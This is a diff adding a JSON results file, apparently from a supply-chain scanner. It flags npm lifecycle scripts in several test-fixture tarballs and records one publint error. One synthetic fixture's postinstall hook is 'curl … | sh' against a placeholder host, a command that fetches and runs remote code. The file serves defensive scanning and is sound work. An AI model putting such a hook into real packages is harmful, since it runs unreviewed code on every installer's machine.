@@ -1,0 +1,112 @@
+[
+  {
+    "fixture": "esbuild-postinstall",
+    "artifact": {
+      "file": ".border/dist/spike-fixture-esbuild-0.25.12.tgz",
+      "sha256": "d1ea9d60564e2a72d955e07043e520ca4dc52aa664623eae7177b5d5ca86bc1c",
+      "bytes": 583
+    },
+    "findings": [
+      {
+        "rule": "lifecycle-script",
+        "severity": "CRITICAL",
+        "target": "artifact",
+        "path": "package/package.json",
+        "engine": "native",
+        "message": "package.json script 'postinstall' is a lifecycle hook — npm executes it on every consumer install (G33): node install.js",
+        "valueDigest": "40fab917150651f4829e4b76c3783dcbcb9fff6b253b136fb4e71502c6f1e8b4",
+        "snippet": "spik…tall"
+      }
+    ]
+  },
+  {
+    "fixture": "msgpackr-extract-install",
+    "artifact": {
+      "file": ".border/dist/spike-fixture-msgpackr-extract-3.0.4.tgz",
+      "sha256": "bf55a943b194dd486271d19fea16690097db1722b7e2b77dd1f996ac7483513e",
+      "bytes": 418
+    },
+    "findings": [
+      {
+        "rule": "lifecycle-script",
+        "severity": "CRITICAL",
+        "target": "artifact",
+        "path": "package/package.json",
+        "engine": "native",
+        "message": "package.json script 'install' is a lifecycle hook — npm executes it on every consumer install (G33): node-gyp-build-optional-packages",
+        "valueDigest": "683889a04cd22e126a18d8e02a9ab9a2a40e3413b8358d10bee3fcdae5ff12f5",
+        "snippet": "spik…tall"
+      }
+    ]
+  },
+  {
+    "fixture": "opencode-postinstall-ref",
+    "artifact": {
+      "file": ".border/dist/spike-fixture-opencode-postinstall-1.18.29.tgz",
+      "sha256": "662dd4ac869b72885456f54130f346139475bbd5cc2e3cfeb8e9779d90f529cd",
+      "bytes": 2336
+    },
+    "findings": [
+      {
+        "rule": "lifecycle-script",
+        "severity": "CRITICAL",
+        "target": "artifact",
+        "path": "package/package.json",
+        "engine": "native",
+        "message": "package.json script 'postinstall' is a lifecycle hook — npm executes it on every consumer install (G33): node ./postinstall.mjs",
+        "valueDigest": "61415faf5c8c08e6bdf6ae2d5166615f1047e7d01a52c757d6633f8d19a6c512",
+        "snippet": "spik…tall"
+      },
+      {
+        "rule": "publint-fail",
+        "severity": "HIGH",
+        "target": "artifact",
+        "path": "package.json",
+        "engine": "native",
+        "message": "publint --level error flagged the packed artifact:\nRunning publint v0.3.24 for /home/lab/workspace/harness/border/.omo/evidence/residue-spike/fixtures/opencode-postinstall-ref/.border/dist/spike-fixture-opencode-postinstall-1.18.29.tgz...\nUnpacking tarball...\nLinting...\nErrors:\n1. pkg.bin.opencode is ./bin/opencode.exe but the file does not exist.",
+        "valueDigest": "2c39db5138d42a078b70ffe66b8fa31941b1e0b02bf42d026441b3ad1cc095bc",
+        "snippet": "spik…lint"
+      }
+    ]
+  },
+  {
+    "fixture": "synthetic-curlsh",
+    "artifact": {
+      "file": ".border/dist/spike-fixture-synthetic-arbitrary-9.9.9.tgz",
+      "sha256": "fde6147c17ec7c967c6b2a4fd6fb3cd209db6051e7ca790065ac39de61550d1a",
+      "bytes": 434
+    },
+    "findings": [
+      {
+        "rule": "lifecycle-script",
+        "severity": "CRITICAL",
+        "target": "artifact",
+        "path": "package/package.json",
+        "engine": "native",
+        "message": "package.json script 'postinstall' is a lifecycle hook — npm executes it on every consumer install (G33): curl -sSL https://installer.example.com/setup.sh | sh",
+        "valueDigest": "7c82dc59880b0a8e5b975daf999d9544bf89a994b106bd7d0f9470ad7c8a2cd0",
+        "snippet": "spik…tall"
+      }
+    ]
+  },
+  {
+    "fixture": "thread-stream-prepare",
+    "artifact": {
+      "file": ".border/dist/spike-fixture-thread-stream-3.2.0.tgz",
+      "sha256": "b2492871b298011aa8aaecad0f3f300b0f25fa7d4678cfcb9bb0aa6240296cbf",
+      "bytes": 404
+    },
+    "findings": [
+      {
+        "rule": "lifecycle-script",
+        "severity": "CRITICAL",
+        "target": "artifact",
+        "path": "package/package.json",
+        "engine": "native",
+        "message": "package.json script 'prepare' is a lifecycle hook — npm executes it on every consumer install (G33): husky install",
+        "valueDigest": "c58632303c1951cd5cca5fd7eedc35256a871a52814cace45d1c214944b8c2ff",
+        "snippet": "spik…pare"
+      }
+    ]
+  }
+]
